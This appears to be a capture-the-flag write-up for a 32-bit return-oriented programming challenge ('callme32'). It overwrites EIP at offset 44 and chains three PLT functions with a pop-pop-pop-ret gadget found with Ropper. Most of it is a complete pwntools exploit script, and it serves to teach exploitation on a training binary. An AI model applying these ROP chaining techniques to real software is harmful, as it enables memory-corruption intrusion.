In this challenge, we need to change the flow of the program so it will call the following functions in the right order:

```
callme_one(1,2,3)
callme_two(1,2,3)
callme_three(1,2,3)
```

Just as with the previous two challenges, EIP is overridden statring with byte 44 of our input.

First, let's find the relevant functions in the PLT:
```python
from pwn import *

e = ELF('./callme32')
callme_one_addr = e.plt['callme_one']
callme_two_addr = e.plt['callme_two']
callme_three_addr = e.plt['callme_three']
exit_addr = e.plt['exit']
```

Next, since the functions receive parameters, we need to find a pop pop pop ret gadget so we'll be able to chain them. We'll use Ropper for that:

```
# ropper -a x86 -f ./callme32 --search "pop % pop % pop % ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop % pop % pop % ret;

[INFO] File: ./callme32
0x080488a8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x080488a9: pop esi; pop edi; pop ebp; ret; 
```

The final exploit script:
```python
from pwn import *

e = ELF('./callme32')
callme_one_addr = e.plt['callme_one']
callme_two_addr = e.plt['callme_two']
callme_three_addr = e.plt['callme_three']
exit_addr = e.plt['exit']
ppr_gadget = 0x080488a9

p = process('./callme32')
p.recvuntil('>')

payload = 'A'*44
payload += p32(callme_one_addr)
payload += p32(ppr_gadget)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_two_addr)
payload += p32(ppr_gadget)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_three_addr)
payload += p32(exit_addr)
payload += p32(1)
payload += p32(2)
payload += p32(3)

p.sendline(payload)
p.interactive()
```